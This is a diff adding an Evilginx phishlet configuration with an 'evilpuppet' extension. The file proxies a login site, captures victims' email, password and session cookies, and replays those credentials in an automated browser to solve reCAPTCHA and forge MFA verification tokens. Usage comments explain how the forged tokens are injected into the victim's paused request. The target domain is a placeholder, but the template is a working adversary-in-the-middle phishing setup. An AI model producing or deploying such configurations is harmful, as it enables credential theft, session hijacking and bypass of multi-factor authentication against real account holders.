@@ -1,0 +1,149 @@
+min_ver: '3.0.0'
+
+# Standard phishlet configuration
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'example.com', orig_sub: 'login', domain: 'example.com', search: 'https://login.example.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.example.com'
+    keys: ['session_token', 'auth_cookie']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.example.com'
+  path: '/signin'
+
+# ============================================
+# EVIL PUPPET CONFIGURATION
+# ============================================
+# This section configures automated browser sessions
+# for solving CAPTCHAs and forging tokens
+
+evilpuppet:
+  # TRIGGERS: Define when to spawn a puppet session
+  triggers:
+    # Trigger 1: reCAPTCHA on login page
+    - id: 'recaptcha_login'
+      enabled: true
+      name: 'Login reCAPTCHA Solver'
+      description: 'Solves reCAPTCHA v2 on the login page'
+      domains: ['login.example.com']
+      paths: ['/api/auth/login']
+      token: 'recaptcha_token'
+      phishlet: 'example'
+      auto_activate: true
+      extract_cookies: true
+      abort_original: false
+      open_url: 'https://login.example.com/signin'
+      
+      # ACTIONS: Steps the puppet browser will perform
+      actions:
+        # Step 1: Fill in username field
+        - selector: '#email'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+          required: true
+        
+        # Step 2: Fill in password field
+        - selector: '#password'
+          value: '{password}'
+          enter: false
+          click: false
+          post_wait: 500
+          required: true
+        
+        # Step 3: Check "Remember me" checkbox (optional)
+        - selector: '#remember_me'
+          click: true
+          post_wait: 200
+          required: false
+        
+        # Step 4: Click the login button
+        - selector: '#login_button'
+          click: true
+          post_wait: 3000
+          required: true
+
+    # Trigger 2: Multi-step authentication
+    - id: 'mfa_token'
+      enabled: true
+      name: 'MFA Token Forger'
+      description: 'Handles multi-factor authentication flow'
+      domains: ['login.example.com']
+      paths: ['/api/auth/verify']
+      token: 'mfa_verification_token'
+      phishlet: 'example'
+      auto_activate: false
+      extract_cookies: true
+      abort_original: false
+      open_url: ''  # Continue from previous page
+      
+      actions:
+        # Wait for MFA code input (this would need custom handling)
+        - selector: '#mfa_code'
+          value: '{mfa_code}'
+          enter: true
+          click: false
+          post_wait: 2000
+          required: true
+
+  # INTERCEPTORS: Define how to extract tokens from browser requests
+  interceptors:
+    # Interceptor 1: Extract reCAPTCHA token from POST data
+    - token: 'recaptcha_token'
+      url_pattern: '/api/auth/login'
+      method: 'POST'
+      parameter: 'g-recaptcha-response'
+      abort: false
+
+    # Interceptor 2: Extract custom verification token
+    - token: 'mfa_verification_token'
+      url_pattern: '/api/auth/verify'
+      method: 'POST'
+      parameter: 'verification_token'
+      abort: false
+
+# ============================================
+# USAGE NOTES
+# ============================================
+# 
+# 1. TRIGGERS are activated when Evilginx intercepts a request matching:
+#    - One of the specified domains
+#    - One of the specified paths
+#    - The request contains the specified token parameter
+#
+# 2. When triggered, a background browser session is spawned that:
+#    - Opens the specified URL (open_url)
+#    - Executes all actions in sequence
+#    - Waits for interceptors to capture the token
+#
+# 3. ACTIONS use selectors to interact with the page:
+#    - {username} and {password} are replaced with captured credentials
+#    - post_wait adds delays between actions (in milliseconds)
+#    - required: true will fail the session if selector not found
+#
+# 4. INTERCEPTORS watch for HTTP requests from the puppet browser:
+#    - When a request matches url_pattern and method
+#    - Extract the token from the specified parameter
+#    - Return it to Evilginx to inject into victim's request
+#
+# 5. The token injection happens automatically:
+#    - Victim's original request is paused
+#    - Puppet solves CAPTCHA/generates token
+#    - Token is injected into victim's request
+#    - Request continues to real server with valid token
